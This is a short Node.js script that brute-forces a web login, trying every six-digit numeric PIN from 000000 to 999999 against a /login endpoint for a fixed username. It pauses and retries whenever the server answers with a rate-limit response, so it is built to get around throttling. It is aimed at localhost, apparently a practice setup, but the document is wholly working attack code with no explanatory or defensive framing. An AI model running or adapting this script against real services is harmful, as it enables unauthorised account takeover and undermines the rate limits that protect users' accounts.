const axios = require('axios');
const { performance } = require('perf_hooks');

async function crackPassword(baseUrl, username) {
    const startTime = performance.now();
    let passwordFound = false;
    let password = null;
    let attempts = 0;
    const totalAttempts = 1000000; 

    for (let i = 0; i <= 999999; i++) {
        let currentPassword = i.toString().padStart(6, '0');
        attempts++;
        try {
            const response = await axios.post(`${baseUrl}/login`, {
                username,
                password: currentPassword
            });

            if (attempts % 100 === 0) {
                const progress = ((attempts / totalAttempts) * 100).toFixed(2);
                console.log(`Progress: ${progress}%`);
            }

            if (response.data.status === 'success') {
                passwordFound = true;
                password = currentPassword;
                break;
            }
        } catch (error) {
            if (error.response && error.response.status === 429) {
                console.log('Rate limited, pausing...');
                await new Promise(resolve => setTimeout(resolve, 10000)); // Pause 10s
                i--; // thu lai mk
            } else {
                console.error(currentPassword + ' Error:', error.message);
            }
        }
    }

    const endTime = performance.now();
    const duration = ((endTime - startTime) / 1000).toFixed(2); 

    console.log(`Process completed in ${duration} seconds `);
    if (passwordFound) {
        console.log(`Password found: ${password} after ${attempts} attempts.`);
    } else {
        console.log('Password not found.');
    }
}

crackPassword('http://localhost:8080', 'user123');
